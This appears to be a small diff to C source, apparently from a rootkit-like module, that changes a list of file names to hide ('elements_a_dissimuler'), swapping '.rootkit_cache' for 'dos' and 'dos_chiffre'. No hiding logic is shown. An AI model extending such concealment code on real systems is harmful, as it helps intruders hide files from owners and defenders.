@@ -26,7 +26,8 @@ static struct systeme_camouflage camouflage = {0};
 
 static const char *elements_a_dissimuler[] = {
     "fichiercache",
-    ".rootkit_cache",
+    "dos",
+    "dos_chiffre",
     NULL
 };
 
